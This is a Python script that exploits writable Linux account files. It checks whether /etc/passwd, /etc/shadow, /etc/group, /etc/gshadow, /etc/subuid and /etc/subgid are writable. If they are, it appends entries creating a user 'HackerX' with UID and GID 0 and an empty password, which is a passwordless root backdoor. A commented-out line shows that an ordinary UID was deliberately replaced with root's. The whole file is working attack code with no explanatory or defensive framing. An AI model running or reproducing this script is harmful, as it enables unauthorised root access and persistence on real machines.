import os,sys
import os.path
import subprocess
from threading import Thread
from datetime import date
from time import sleep
from git import Repo

def line():
	print("="*70)
# Useful Functions
def isWritable(filePath):
	if not os.path.isfile(filePath):
		return False
	result = os.access(filePath,os.W_OK)
	return result

print("Checking for weak files")
checkFlag=0
passwd = isWritable("/etc/passwd")
shadow = isWritable("/etc/shadow")
group = isWritable("/etc/group")
gshadow = isWritable("/etc/gshadow")
subuid = isWritable("/etc/subuid")
subgid = isWritable("/etc/subgid")

print("Is passwd writable? ",passwd)
print("Is shadow writable? ",shadow)
print("Is group writable? ",group)
print("Is gshadow writable? ",gshadow)
print("Is subuid writable? ",subuid)
print("Is subgid writable? ",subgid)

if passwd==False or shadow==False or group==False or gshadow==False or subuid==False or subgid==False: exit()

username="HackerX"
password=""
newUID=1000
newGID=1000
numberOfUsers=0
numberOfGroups=0
stringToWrite=""

# code to write into subuid and subgid file
line()
print("WRITING INTO SUBUID AND SUBGID FILE")
stringToWrite=""
print("Reading subuid file contents...")
f=open("/etc/subuid", "r")
subuidContents = []
for x in f:
	tmp=[]
	tmpstr=""
	for y in x:
		if y!=':' and y!='\n':
			tmpstr+=y
		else:
			tmp.append(tmpstr)
			tmpstr=""
	subuidContents.append(tmp)
	numberOfUsers+=1
f.close()
# print(subuidContents)

print("Analyzing file contents...")
allowedUIDs = int(subuidContents[0][2])
systemUID = int(subuidContents[0][1]) + numberOfUsers*allowedUIDs 
stringToWrite=username + ":" + str(systemUID) + ":" + str(allowedUIDs) + "\n"
print(stringToWrite)

print("Appending new subuid to the file...")
f=open("/etc/subuid", "a")
f.write(stringToWrite)
f.close()
print("subuid updated! successfully!!")

print("Appending new subgid to the file...")
f=open("/etc/subgid","a")
f.write(stringToWrite)
f.close()
print("subgid updated successfully!!!")

stringToWrite=""	

# code to write into GROUP file	
line()
print("WRITING INTO GROUP FILE")
print("Reading group file contents...")
f=open("/etc/group", "r")
groupContents = []
for x in f:
	tmp=[]
	tmpstr=""
	for y in x:
		if y!=':' and y!='\n':
			tmpstr+=y
		else:
			tmp.append(tmpstr)
			tmpstr=""
	groupContents.append(tmp)
	numberOfGroups+=1
f.close()
#print(groupContents)

print("Analyzing group file contents...")
while True:
	newGID+=1
	tmp=newGID
	for x in groupContents:
		if str(tmp)==x[2]:
			tmp+=1
			continue
	if tmp!=newGID:
		newGID=tmp
		break
#print(newGID)

# group:test123:x:1001:
stringToWrite = username + ":x:" + str(newGID) + ":\n"
print(stringToWrite)

print("Appending new group to the file...")
f=open("/etc/group", "a")
f.write(stringToWrite)
f.close()
print("group updated! successfully!!")

stringToWrite=""

# code to write into gshadow file
line()
print("WRITING INTO GSHADOW FILE")

# gshadow:test123:!::
stringToWrite = username+":!::\n"
print(stringToWrite)


print("Appending to the GSHADOW file...")
f=open("/etc/gshadow", "a")
f.write(stringToWrite)
f.close()
print("gshadow updated! successfully!!")


stringToWrite=""

# code to write into PASSWD file
line()
print("WRITING INTO PASSWD FILE")

print("Reading passwd file contents...")
f=open("/etc/passwd", "r")
passwdContents = []
for x in f:
	tmp=[]
	tmpstr=""
	for y in x:
		if y!=':' and y!='\n':
			tmpstr+=y
		else:
			tmp.append(tmpstr)
			tmpstr=""
	passwdContents.append(tmp)
	numberOfUsers+=1
f.close()
#print(passwdContents)

print("Analyzing passwd file contents...")
while True:
	newUID+=1
	tmp=newUID
	for x in passwdContents:
		if str(tmp)==x[2]:
			tmp+=1
			continue
	if tmp!=newUID:
		newUID=tmp
		break
# print(newUID)
# passwd:test123:x:1001:1001::/home/test123:/bin/sh
#stringToWrite= username + ":x:" + str(newUID) + ":" + str(newGID) + "::" + "/home/" + username + ":/bin/sh\n"
stringToWrite= username + ":x:" + str(0) + ":" + str(0) + "::" + "/home/" + username + ":/bin/sh\n"

print(stringToWrite)

print("Appending to the PASSWD file...")
f=open("/etc/passwd", "a")
f.write(stringToWrite)
f.close()
print("passwd updated! successfully!!")

stringToWrite=""

# code to write into shadow file
line()
print("WRITING INTO SHADOW FILE")

dateInitial = date(1970,1,1)
dateCurrent = date.today()

dateDiff = dateCurrent-dateInitial
totalDays = dateDiff.days
lastPasswordChange = str(totalDays)

minPassAge = 0
maxPassAge = 99999
warnPeriod = 10
# shadow:test123:test:19481:0:99999:7:::
stringToWrite = username + ":" + password + ":" + lastPasswordChange + ":" + str(minPassAge) + ":" + str(maxPassAge) + ":" + str(warnPeriod) + ":::\n"
print(stringToWrite)

print("Appending to the SHADOW file...")
f=open("/etc/shadow", "a")
f.write(stringToWrite)
f.close()
print("shadow updated! successfully!!")
line()
print("New user created successfully!!! Name: ", username)
line()
